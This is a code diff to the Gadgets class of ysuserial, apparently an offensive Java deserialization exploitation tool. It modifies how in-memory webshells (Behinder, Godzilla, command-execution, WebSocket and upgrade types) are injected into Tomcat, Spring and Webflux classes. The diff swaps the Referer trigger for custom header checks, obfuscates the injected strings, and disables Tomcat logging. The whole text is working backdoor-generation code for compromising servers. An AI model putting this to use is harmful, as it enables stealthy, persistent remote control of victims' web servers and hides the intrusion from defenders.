@@ -2,6 +2,7 @@ package org.su18.ysuserial.payloads.util;
 
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+import static org.su18.ysuserial.Strings.converString;
 import static org.su18.ysuserial.payloads.config.Config.*;
 import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
 import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
@@ -194,6 +195,12 @@ public class Gadgets {
 			String className = myClass.getName();
 			ctClass = pool.get(className);
 
+			// 从 Request 中获取的内存马逻辑需要 Header 判断
+			if (className.contains("TLNeoRegFromThread")) {
+				insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=\"" + HEADER_KEY + "\";");
+				insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=\"" + HEADER_VALUE + "\";");
+			}
+
 			// 为 DefineClassFromParameter 添加自定义函数功能
 			if (className.endsWith("DefineClassFromParameter")) {
 				insertField(ctClass, "parameter", "public static String parameter = \"" + PARAMETER + "\";");
@@ -239,13 +246,6 @@ public class Gadgets {
 				} else if (className.contains("EXMS")) {
 					insertKeyMethod(ctClass, "execute");
 				} else if (StringUtils.isNotEmpty(cName)) {
-
-					// 从 Request 中获取的内存马逻辑需要 Referer 判断
-					if (className.contains("FromRequest")) {
-						String referer = "referer=\"" + REFERER + "\";";
-						ctClass.makeClassInitializer().insertBefore(referer);
-					}
-
 					insertKeyMethod(ctClass, cName);
 				}
 			}
@@ -372,10 +372,6 @@ public class Gadgets {
 		boolean isTomcat  = name.startsWith("T") || name.startsWith("Spring");
 		boolean isWebflux = name.contains("Webflux");
 
-		if (isWebflux) {
-			insertField(ctClass, "REFERER", "public String REFERER=\"" + REFERER + "\";");
-		}
-
 		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
 		String method = name.contains("SpringControllerMS") ? "drop" : "";
 
@@ -389,6 +385,10 @@ public class Gadgets {
 				break;
 			}
 		}
+
+		// 命令执行、各种内存马
+		insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=" + converString(HEADER_KEY) + ";");
+		insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(HEADER_VALUE) + ";");
 
 		if ("bx".equals(type)) {
 			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
@@ -409,10 +409,10 @@ public class Gadgets {
 				shell = IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
 			}
 
-			insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD).replace("https://su18.org/", REFERER));
+			insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD));
 		} else if ("gz".equals(type)) {
 			insertField(ctClass, "payload", "Class payload ;");
-			insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
+			insertField(ctClass, "xc", "String xc = " + converString(PASSWORD) + ";");
 
 			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
@@ -422,15 +422,15 @@ public class Gadgets {
 			if (isWebflux) {
 				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL_FOR_WEBFLUX));
 			} else {
-				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL).replace("https://su18.org/", REFERER));
+				insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL));
 			}
 		} else if ("gzraw".equals(type)) {
 			insertField(ctClass, "payload", "Class payload ;");
-			insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
+			insertField(ctClass, "xc", "String xc = " + converString(PASSWORD) + ";");
 
 			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
 			insertTomcatNoLog(ctClass);
-			insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL).replace("https://su18.org/", REFERER));
+			insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL));
 		} else if ("execute".equals(type)) {
 			insertField(ctClass, "TAG", "public static String TAG = \"su18\";");
 			insertCMD(ctClass);
@@ -443,27 +443,27 @@ public class Gadgets {
 			insertCMD(ctClass);
 			insertMethod(ctClass, method, base64Decode(WS_SHELL));
 		} else if ("upgrade".equals(type)) {
-			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = \"" + CMD_HEADER_STRING + "\";");
+			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");
 
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
 			insertCMD(ctClass);
 			insertMethod(ctClass, method, base64Decode(UPGRADE_SHELL));
 		} else {
 			insertCMD(ctClass);
-			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = \"" + CMD_HEADER_STRING + "\";");
+			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");
 
 			if (isWebflux) {
 				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_WEBFLUX));
 			} else if (isTomcat) {
 				insertTomcatNoLog(ctClass);
-				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT).replace("https://su18.org/", REFERER));
+				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT));
 			} else {
-				insertMethod(ctClass, method, base64Decode(CMD_SHELL).replace("https://su18.org/", REFERER));
+				insertMethod(ctClass, method, base64Decode(CMD_SHELL));
 			}
 		}
 
 		ctClass.setName(generateClassName());
-		insertField(ctClass, "pattern", "public static String pattern = \"" + URL_PATTERN + "\";");
+		insertField(ctClass, "pattern", "public static String pattern = " + converString(URL_PATTERN) + ";");
 
 	}
 
